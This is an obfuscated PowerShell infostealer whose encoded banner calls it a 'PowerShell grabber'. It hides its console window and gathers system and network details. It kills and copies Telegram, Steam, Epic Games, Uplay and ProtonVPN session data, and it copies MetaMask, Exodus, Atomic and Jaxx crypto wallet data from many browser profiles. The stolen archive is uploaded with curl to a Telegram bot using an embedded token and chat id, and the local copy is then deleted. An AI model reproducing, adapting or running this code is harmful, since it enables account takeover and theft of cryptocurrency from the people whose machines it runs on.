$ErrorActionPreference= 'silentlycontinue'
$ᵃ = $env:COMPUTERNAME
$ᵇ = Get-Random

$ᶜ = "-4843398935" 
$ᵈ = "8011090957:AAFx3ViYWVUvefYiSBprpXcQA9JRyUEncWM" 

$ᵉ = "true" 
$ᶠ = "true" 
$ᵍ = "true" 
$ʰ = "true" 
$ⁱ = "true" 
$ʲ = "true" 
$ᵏ = "true" 
$ˡ = "true" 
$ᵐ = "true" 

$ⁿ = Get-Date -Format "MM/dd/yyyy"
$ᵒ = Get-Date -Format "MM-dd-yyyy"

$ᵖ = Invoke-WebRequest -Uri "http://ip-api.com/json/?fields=8194" -UseBasicParsing
$ᵖ = $ᵖ.Content | ConvertFrom-Json
$ᵠ = $ᵖ.countryCode
$ᵖ = $ᵖ.query

$ʳ = "$env:LOCALAPPDATA\$ᵠ`_$ᵃ($ᵒ)$ᵇ"
$ˢ = "$env:LOCALAPPDATA\$ᵠ`_$ᵃ($ᵒ)$ᵇ\Sessions"
$ᵗ = "$env:LOCALAPPDATA\$ᵠ`_$ᵃ($ᵒ)$ᵇ\Sessions\Crypto"

$ᵘ = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQoqICAuZDg4ODhiLiAgICAgICAgICAgIC5kODg4OGIuICAgICAgZDg4ODggIDg4ODg4ODg4ODggIC5kODg4OGIuICAgLmQ4ODg4Yi4gIDg4ODg4ODg4ODggKgoqIGQ4OFAgIFk4OGIgICAgICAgICAgZDg4UCAgWTg4YiAgICBkOFA4ODggICAgICAgIGQ4OFAgZDg4UCAgWTg4YiBkODhQICBZODhiIDg4OCAgICAgICAgKgoqIDg4OCAgICA4ODggICAgICAgICAgODg4ICAgICAgICAgIGQ4UCA4ODggICAgICAgZDg4UCAgICAgICAuZDg4UCA4ODggICAgICAgIDg4OCAgICAgICAgKgoqIDg4OCAgICA4ODggODg4ICA4ODggODg4ZDg4OGIuICAgZDhQICA4ODggICAgICBkODhQICAgICAgIDg4ODgiICA4ODhkODg4Yi4gIDg4ODg4ODggICAgKgoqIDg4OCAgICA4ODggYFk4YmQ4UCcgODg4UCAiWTg4YiBkODggICA4ODggICA4ODg4ODg4OCAgICAgICAiWThiLiA4ODhQICJZODhiIDg4OCAgICAgICAgKgoqIDg4OCAgICA4ODggICBYODhLICAgODg4ICAgIDg4OCA4ODg4ODg4ODg4ICAgZDg4UCAgICAgODg4ICAgIDg4OCA4ODggICAgODg4IDg4OCAgICAgICAgKgoqIFk4OGIgIGQ4OFAgLmQ4IiI4Yi4gWTg4YiAgZDg4UCAgICAgICA4ODggICBkODhQICAgICAgWTg4YiAgZDg4UCBZODhiICBkODhQIDg4OCAgICAgICAgKgoqICAiWTg4ODhQIiAgODg4ICA4ODggICJZODg4OFAiICAgICAgICA4ODggIGQ4OFAgICAgICAgICJZODg4OFAiICAgIlk4ODg4UCIgIDg4ODg4ODg4ODggKgoqICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKgoqICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQb3dlclNoZWxsIGdyYWJiZXIgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKgoqICAgICAgICAgICAgICAgICAgICAgICAgICAgIG1hZGUgYnk6IGRpc25leXJpdG96eC8weDY0NzM2RSAgICAgICAgICAgICAgICAgICAgICAgICAgICAgKgo9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09"))
$ᵛ = "$ᵘ`nLog Name : $ᵃ`nLog Date : $ⁿ`n"

New-Item -ItemType Directory -Path $ʳ -Force
New-Item -ItemType Directory -Path $ˢ -Force

$ʷ = "Not Found"
$ˣ = "Not Found"
$ʸ = "Not Found"
$ᶻ = "Not Found"
$ᴬ = "Not Found"
$ᴮ = "Not Found"
$ᴰ = "Not Found"
$ᴱ = "Not Found"
$ᴲ = "Not Found"

function ᴳ {
    if (-not ("Console.Window" -as [type])) { 
        Add-Type -Name Window -Namespace Console -MemberDefinition '
        [DllImport("Kernel32.dll")]
        public static extern IntPtr GetConsoleWindow();
        [DllImport("user32.dll")]
        public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
        '
    }
    $ᴴ = [Console.Window]::GetConsoleWindow()
    $null = [Console.Window]::ShowWindow($ᴴ, 0)
}

function ᴵ {
    $ᴶ = (Get-WmiObject -class Win32_OperatingSystem).Caption
    $ᴷ = Get-WmiObject -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID
    $ᴸ = Get-WmiObject -Class Win32_Processor | Select-Object -ExpandProperty Name
    $ᴹ = (Get-WmiObject Win32_VideoController).Name 
    $ᴺ = Get-CimInstance Win32_PhysicalMemory | Measure-Object -Property capacity -Sum | ForEach-Object {"{0:N2}" -f ([math]::round(($_.Sum / 1GB),2))}    
    $ᴼ = "$ᵛ`n========================================================`n`nOS  : $ᴶ`n`nUUID : $ᴷ`n`nCPU : $ᴸ`n`nGPU : $ᴹ`n`nRAM : $ᴺ`n`n========================================================"
    $ᴼ > $ʳ\System.txt
}

function ᴾ {
    $ᴿ = (Get-WmiObject win32_networkadapterconfiguration -ComputerName $env:COMPUTERNAME | Where-Object{$_.IpEnabled -Match "True"} | Select-Object -Expand macaddress) -join ","
    $ᵀ = "$ᵛ`n========================================================`n`nIP  : $ᵖ`n`nMAC : $ᴿ`n`n========================================================"
    $ᵀ > $ʳ\Network.txt
}

function ᵁ {
    $ᵂ = @(
        "$env:localappdata\EpicGamesLauncher",
        "${Env:ProgramFiles}\Epic Games\Launcher",
        "${Env:ProgramFiles(x86)}\Epic Games\Launcher"
    )

    foreach ($ᵃᵃ in $ᵂ) {
        if (Test-Path $ᵃᵃ) {
            $ᵃᵇ = "epicgameslauncher"
            try {if (Get-Process $ᵃᵇ -ErrorAction SilentlyContinue ) {Get-Process -Name $ᵃᵇ | Stop-Process }} catch {}
            $ᵃᶜ = "$env:temp\Vare-EpicGames"
            New-Item -ItemType Directory -Force -Path $ᵃᶜ
            Copy-Item -Path "$ᵃᵃ\Saved\Config" -Destination $ᵃᶜ -Recurse -force
            Copy-Item -Path "$ᵃᵃ\Saved\Logs" -Destination $ᵃᶜ -Recurse -force
            Copy-Item -Path "$ᵃᵃ\Saved\Data" -Destination $ᵃᶜ -Recurse -force
            Compress-Archive -Path $ᵃᶜ -DestinationPath "$ˢ\EpicGames.zip" -CompressionLevel Fastest -Force
            Remove-Item $ᵃᶜ -Recurse -Force
            break
        }
    }
}

function ᵃᵈ {
    $ᵃᵉ = @(
        "$env:localappdata\protonvpn",
        "${Env:ProgramFiles}\ProtonVPN",
        "${Env:ProgramFiles(x86)}\ProtonVPN"
    )

    foreach ($ᵃᶠ in $ᵃᵉ) {
        if (Test-Path $ᵃᶠ) {
            $ᵃᵍ = "protonvpn"
            try {if (Get-Process $ᵃᵍ -ErrorAction SilentlyContinue ) {Get-Process -Name $ᵃᵍ | Stop-Process }} catch {}
            $ᵃʰ = "$env:temp\Vare-ProtonVPN"
            New-Item -ItemType Directory -Force -Path $ᵃʰ
            $ᵃⁱ = "^(ProtonVPN_Url_[A-Za-z0-9]+)$"
            $ᵃʲ = Get-ChildItem -Path $ᵃᶠ -Directory | Where-Object { $_.Name -match $ᵃⁱ }
            $ᵃᵏ = Get-ChildItem -Path $ᵃᶠ -File | Where-Object { $_.Name -match $ᵃⁱ }
            foreach ($ᵃˡ in $ᵃʲ) {
                $ᵃᵐ = Join-Path -Path $ᵃʰ -ChildPath $ᵃˡ.Name
                Copy-Item -Path $ᵃˡ.FullName -Destination $ᵃᵐ -Recurse -Force
            }
            foreach ($ᵃⁿ in $ᵃᵏ) {
                $ᵃᵒ = Join-Path -Path $ᵃʰ -ChildPath $ᵃⁿ.Name
                Copy-Item -Path $ᵃⁿ.FullName -Destination $ᵃᵒ -Force
            }
            Copy-Item -Path "$ᵃᶠ\Startup.profile" -Destination $ᵃʰ -Recurse -force
            Compress-Archive -Path $ᵃʰ -DestinationPath "$ˢ\ProtonVPN.zip" -CompressionLevel Fastest -Force
            Remove-Item $ᵃʰ -Recurse -Force
            break
        }
    }
}

function ᵃᵖ {
    $ᵃᵠ = "$env:userprofile\AppData\Roaming\Telegram Desktop\tdata"
    if (!(Test-Path $ᵃᵠ)) {return}
    $ᵃʳ = "telegram"
    try {if (Get-Process $ᵃʳ -ErrorAction SilentlyContinue ) {Get-Process -Name $ᵃʳ | Stop-Process }} catch {}
    $ᵃˢ = "$ˢ\Telegram.zip"
    $ᵃᵗ = @("_*.config","dumps","tdummy","emoji","user_data","user_data#2","user_data#3","user_data#4","user_data#5","user_data#6","*.json","webview")
    $ᵃᵘ = Get-ChildItem -Path $ᵃᵠ -Exclude $ᵃᵗ
    Compress-Archive -Path $ᵃᵘ -DestinationPath $ᵃˢ -CompressionLevel Fastest -Force
}

function ᵃᵛ {
    $ᵃʷ = @{
        "OperaGX" = "$env:APPDATA\Opera Software\Opera GX Stable\Local Extension Settings\"
        "Opera" = "$env:APPDATA\Opera Software\Opera Stable\Local Extension Settings\"
        "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local Extension Settings\"
        "Chrome1" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 1\Local Extension Settings\"
        "Chrome2" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 2\Local Extension Settings\"
        "Chrome3" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 3\Local Extension Settings\"
        "Chrome4" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 4\Local Extension Settings\"
        "Chrome5" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 5\Local Extension Settings\"
        "Edge" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local Extension Settings\"
        "Edge1" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Profile 1\Local Extension Settings\"
        "Edge2" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Profile 2\Local Extension Settings\"
        "Edge3" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Profile 3\Local Extension Settings\"
        "Edge4" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Profile 4\Local Extension Settings\"
        "Edge5" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Profile 5\Local Extension Settings\"
        "Brave" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local Extension Settings\"
        "Brave1" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 1\Local Extension Settings\"
        "Brave2" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 2\Local Extension Settings\"
        "Brave3" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 3\Local Extension Settings\"
        "Brave4" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 4\Local Extension Settings\"
        "Brave5" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 5\Local Extension Settings\"
        "Vivaldi" = "$env:LOCALAPPDATA\Vivaldi\User Data\Local Extension Settings\"
        "Vivaldi1" = "$env:LOCALAPPDATA\Vivaldi\User Data\Profile 1\Local Extension Settings\"
        "Vivaldi2" = "$env:LOCALAPPDATA\Vivaldi\User Data\Profile 2\Local Extension Settings\"
        "Vivaldi3" = "$env:LOCALAPPDATA\Vivaldi\User Data\Profile 3\Local Extension Settings\"
        "Vivaldi4" = "$env:LOCALAPPDATA\Vivaldi\User Data\Profile 4\Local Extension Settings\"
        "Vivaldi5" = "$env:LOCALAPPDATA\Vivaldi\User Data\Profile 5\Local Extension Settings\"
    }

    $ᵃˣ = @{
        "Meta" = "nkbihfbeogaeaoehlefnkodbefgpgknn"
    }

    foreach ($ᵃʸ in $ᵃʷ.Keys) {
        $ᵃᶻ = $ᵃʷ[$ᵃʸ]

        foreach ($ᵃᴬ in $ᵃˣ.Keys) {
            $ᵃᴮ = $ᵃˣ[$ᵃᴬ]
            $ᵃᴰ = "$env:temp\$ᵃʸ-MetaMask"
            $ᵃᴱ = "$ᵃᶻ$ᵃᴮ"
            if (Test-Path -Path $ᵃᴱ -PathType Container) {
                New-Item -ItemType Directory -Path $ᵗ -Force
                Copy-Item -Path $ᵃᴱ -Destination $ᵃᴰ -Recurse -force
                Compress-Archive -Path $ᵃᴰ -DestinationPath "$ᵗ\$ᵃʸ-MetaMask" -CompressionLevel Fastest -Force
                Remove-Item $ᵃᴰ -Recurse -Force
            }
        }
    }    
}

function ᵃᴲ {
    $ᵃᴳ = @(
        "${Env:ProgramFiles(x86)}\Steam",
        "${Env:ProgramFiles}\Steam",
        "$env:LOCALAPPDATA\Steam"
    )

    foreach ($ᵃᴴ in $ᵃᴳ) {
        if (Test-Path $ᵃᴴ) {
            $ᵃᴵ = "steam"
            try {if (Get-Process $ᵃᴵ -ErrorAction SilentlyContinue ) {Get-Process -Name $ᵃᴵ | Stop-Process }} catch {}
            $ᵃᴶ = "$env:TEMP\Vare-Steam"
            New-Item -ItemType Directory -Force -Path $ᵃᴶ
            Copy-Item -Path "$ᵃᴴ\config" -Destination $ᵃᴶ -Recurse -force
            $ᵃᴷ = @("ssfn$1")
            foreach($ᵃᴸ in $ᵃᴷ) {
                Get-ChildItem -path $ᵃᴴ -Filter ([regex]::escape($ᵃᴸ) + "*") -Recurse -File | ForEach-Object { Copy-Item -path $PSItem.FullName -Destination $ᵃᴶ }
            }
            Compress-Archive -Path $ᵃᴶ -DestinationPath "$ˢ\Steam.zip" -CompressionLevel Fastest -Force
            Remove-Item $ᵃᴶ -Recurse -Force
            break
        }
    }
}

function ᵃᴹ {
    $ᵃᴺ = @(
        "$env:localappdata\Ubisoft Game Launcher",
        "${Env:ProgramFiles}\Ubisoft\Ubisoft Game Launcher",
        "${Env:ProgramFiles(x86)}\Ubisoft\Ubisoft Game Launcher"
    )

    foreach ($ᵃᴼ in $ᵃᴺ) {
        if (Test-Path $ᵃᴼ) {
            $ᵃᴾ = "upc"
            try {if (Get-Process $ᵃᴾ -ErrorAction SilentlyContinue ) {Get-Process -Name $ᵃᴾ | Stop-Process }} catch {}
            $ᵃᴿ = "$env:temp\Vare-Uplay"
            New-Item -ItemType Directory -Force -Path $ᵃᴿ
            Copy-Item -Path "$ᵃᴼ\cache" -Destination $ᵃᴿ -Recurse -force
            Copy-Item -Path "$ᵃᴼ\data" -Destination $ᵃᴿ -Recurse -force
            Copy-Item -Path "$ᵃᴼ\savegames" -Destination $ᵃᴿ -Recurse -force
            Compress-Archive -Path $ᵃᴿ -DestinationPath "$ˢ\Uplay.zip" -CompressionLevel Fastest -Force
            Remove-Item $ᵃᴿ -Recurse -Force
            break
        }
    }
}

function ᵃᵀ {
    $ᵃᵁ = @{
        "OperaGX" = "$env:APPDATA\Opera Software\Opera GX Stable\Local Extension Settings\"
        "Opera" = "$env:APPDATA\Opera Software\Opera Stable\Local Extension Settings\"
        "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local Extension Settings\"
        "Chrome1" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 1\Local Extension Settings\"
        "Chrome2" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 2\Local Extension Settings\"
        "Chrome3" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 3\Local Extension Settings\"
        "Chrome4" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 4\Local Extension Settings\"
        "Chrome5" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 5\Local Extension Settings\"
        "Edge" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local Extension Settings\"
        "Edge1" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Profile 1\Local Extension Settings\"
        "Edge2" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Profile 2\Local Extension Settings\"
        "Edge3" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Profile 3\Local Extension Settings\"
        "Edge4" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Profile 4\Local Extension Settings\"
        "Edge5" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Profile 5\Local Extension Settings\"
        "Brave" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local Extension Settings\"
        "Brave1" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 1\Local Extension Settings\"
        "Brave2" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 2\Local Extension Settings\"
        "Brave3" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 3\Local Extension Settings\"
        "Brave4" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 4\Local Extension Settings\"
        "Brave5" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 5\Local Extension Settings\"
        "Vivaldi" = "$env:LOCALAPPDATA\Vivaldi\User Data\Local Extension Settings\"
        "Vivaldi1" = "$env:LOCALAPPDATA\Vivaldi\User Data\Profile 1\Local Extension Settings\"
        "Vivaldi2" = "$env:LOCALAPPDATA\Vivaldi\User Data\Profile 2\Local Extension Settings\"
        "Vivaldi3" = "$env:LOCALAPPDATA\Vivaldi\User Data\Profile 3\Local Extension Settings\"
        "Vivaldi4" = "$env:LOCALAPPDATA\Vivaldi\User Data\Profile 4\Local Extension Settings\"
        "Vivaldi5" = "$env:LOCALAPPDATA\Vivaldi\User Data\Profile 5\Local Extension Settings\"
    }

    $ᵃᵂ = @{
        "Exodus" = "aholpfdialjgjfhomihkjbmgjidlcdno"
    }

    foreach ($ᵃᵃᵃ in $ᵃᵁ.Keys) {
        $ᵃᵃᵇ = $ᵃᵁ[$ᵃᵃᵃ]
        foreach ($ᵃᵃᶜ in $ᵃᵂ.Keys) {
            $ᵃᵃᵈ = $ᵃᵂ[$ᵃᵃᶜ]
            $ᵃᵃᵉ = "$env:temp\$ᵃᵃᵃ-Exodus"
            $ᵃᵃᶠ = "$ᵃᵃᵇ$ᵃᵃᵈ"
            if (Test-Path -Path $ᵃᵃᶠ -PathType Container) {
                New-Item -ItemType Directory -Path $ᵗ -Force
                Copy-Item -Path $ᵃᵃᶠ -Destination $ᵃᵃᵉ -Recurse -force
                Compress-Archive -Path $ᵃᵃᵉ -DestinationPath "$ᵗ\$ᵃᵃᵃ-Exodus" -CompressionLevel Fastest -Force
                Remove-Item $ᵃᵃᵉ -Recurse -Force
            }
        }
    }
}

function ᵃᵃᵍ {
    $ᵃᵃʰ = @{
        "OperaGX" = "$env:APPDATA\Opera Software\Opera GX Stable\Local Extension Settings\"
        "Opera" = "$env:APPDATA\Opera Software\Opera Stable\Local Extension Settings\"
        "Chrome" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local Extension Settings\"
        "Chrome1" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 1\Local Extension Settings\"
        "Chrome2" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 2\Local Extension Settings\"
        "Chrome3" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 3\Local Extension Settings\"
        "Chrome4" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 4\Local Extension Settings\"
        "Chrome5" = "$env:LOCALAPPDATA\Google\Chrome\User Data\Profile 5\Local Extension Settings\"
        "Edge" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Local Extension Settings\"
        "Edge1" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Profile 1\Local Extension Settings\"
        "Edge2" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Profile 2\Local Extension Settings\"
        "Edge3" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Profile 3\Local Extension Settings\"
        "Edge4" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Profile 4\Local Extension Settings\"
        "Edge5" = "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Profile 5\Local Extension Settings\"
        "Brave" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Local Extension Settings\"
        "Brave1" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 1\Local Extension Settings\"
        "Brave2" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 2\Local Extension Settings\"
        "Brave3" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 3\Local Extension Settings\"
        "Brave4" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 4\Local Extension Settings\"
        "Brave5" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser\User Data\Profile 5\Local Extension Settings\"
        "Vivaldi" = "$env:LOCALAPPDATA\Vivaldi\User Data\Local Extension Settings\"
        "Vivaldi1" = "$env:LOCALAPPDATA\Vivaldi\User Data\Profile 1\Local Extension Settings\"
        "Vivaldi2" = "$env:LOCALAPPDATA\Vivaldi\User Data\Profile 2\Local Extension Settings\"
        "Vivaldi3" = "$env:LOCALAPPDATA\Vivaldi\User Data\Profile 3\Local Extension Settings\"
        "Vivaldi4" = "$env:LOCALAPPDATA\Vivaldi\User Data\Profile 4\Local Extension Settings\"
        "Vivaldi5" = "$env:LOCALAPPDATA\Vivaldi\User Data\Profile 5\Local Extension Settings\"
    }

    $ᵃᵃⁱ = @{
        "Atomic" = "nncfhbggkjjofbkojlgeoelohndodcah"
    }

    foreach ($ᵃᵃʲ in $ᵃᵃʰ.Keys) {
        $ᵃᵃᵏ = $ᵃᵃʰ[$ᵃᵃʲ]
        foreach ($ᵃᵃˡ in $ᵃᵃⁱ.Keys) {
            $ᵃᵃᵐ = $ᵃᵃⁱ[$ᵃᵃˡ]
            $ᵃᵃⁿ = "$env:temp\$ᵃᵃʲ-Atomic"
            $ᵃᵃᵒ = "$ᵃᵃᵏ$ᵃᵃᵐ"
            if (Test-Path -Path $ᵃᵃᵒ -PathType Container) {
                New-Item -ItemType Directory -Path $ᵗ -Force
                Copy-Item -Path $ᵃᵃᵒ -Destination $ᵃᵃⁿ -Recurse -force
                Compress-Archive -Path $ᵃᵃⁿ -DestinationPath "$ᵗ\$ᵃᵃʲ-Atomic" -CompressionLevel Fastest -Force
                Remove-Item $ᵃᵃⁿ -Recurse -Force
            }
        }
    }
}

function ᵃᵃᵖ {
    $ᵃᵃᵠ = "$env:APPDATA\Jaxx\Local Storage\leveldb"
    if (!(Test-Path $ᵃᵃᵠ)) {return}
    $ᵃᵃʳ = "$env:temp\Vare-Jaxx"
    New-Item -ItemType Directory -Force -Path $ᵃᵃʳ
    Copy-Item -Path $ᵃᵃᵠ -Destination $ᵃᵃʳ -Recurse -force
    Compress-Archive -Path $ᵃᵃʳ -DestinationPath "$ᵗ\Jaxx.zip" -CompressionLevel Fastest -Force
    Remove-Item $ᵃᵃʳ -Recurse -Force
}

function ᵃᵃˢ {
    ᴳ
    ᴵ
    ᴾ
    if ($ᵉ -eq "true") {
        ᵃᵖ
    }
    if ($ⁱ -eq "true") {
        ᵃᴲ
    }
    if ($ᶠ -eq "true") {
        ᵁ
    }
    if ($ᵍ -eq "true") {
        ᵃᵈ
    }
    if ($ʰ -eq "true") {
        ᵃᵛ
    }
    if ($ʲ -eq "true") {
        ᵃᴹ
    }
    if ($ᵏ -eq "true") {
        ᵃᵀ
    }
    if ($ˡ -eq "true") {
        ᵃᵃᵍ
    }
    if ($ᵐ -eq "true") {
        ᵃᵃᵖ
    }
}

ᵃᵃˢ

if (!(Test-Path "$ˢ\Telegram.zip")) {} else {
    $ˣ = "Found"
}
if (!(Test-Path "$ˢ\Steam.zip")) {} else {
    $ʷ = "Found"
}
if (!(Test-Path "$ˢ\ProtonVPN.zip")) {} else {
    $ᶻ = "Found"
}
if (!(Test-Path "$ˢ\EpicGames.zip")) {} else {
    $ʸ = "Found"
}
if (!(Test-Path "$ˢ\Uplay.zip")) {} else {
    $ᴮ = "Found"
}
if (!(Test-Path "$ᵗ")) {} else {
    $ᴬ = "Found"
}
if (!(Test-Path "$ᵗ\*Exodus*")) {} else {
    $ᴰ = "Found"
}
if (!(Test-Path "$ᵗ\*Atomic*")) {} else {
    $ᴱ = "Found"
}
if (!(Test-Path "$ᵗ\Jaxx.zip")) {} else {
    $ᴲ = "Found"
}
$ᵃᵃᵗ = "$ᵛ`n========================================================`n`nTelegram  : $ˣ`n`nSteam : $ʷ`n`nMetaMask : $ᴬ`n`nProtonVPN : $ᶻ`n`nEpic Games : $ʸ`n`nUplay : $ᴮ`n`nExodus : $ᴰ`n`nAtomic : $ᴱ`n`nJaxx : $ᴲ`n`n========================================================"
$ᵃᵃᵗ > "$ʳ\Sessions.txt"

Compress-Archive -Path $ʳ -DestinationPath "$ʳ.zip" -CompressionLevel Fastest -Force
Remove-Item $ʳ -Recurse -Force

$ᵃᵃᵁ = "$ʳ.zip"
$ᵃᵃᵂ = "https://api.telegram.org/bot$ᵈ/sendDocument"

$ᵃᵃᵃᵃ = "curl.exe -X POST -H ""content-type: multipart/form-data"" -F document=@'$ᵃᵃᵁ' -F chat_id=$ᶜ $ᵃᵃᵂ"
Invoke-Expression $ᵃᵃᵃᵃ
Remove-Item "$ʳ.zip" -Recurse -Force
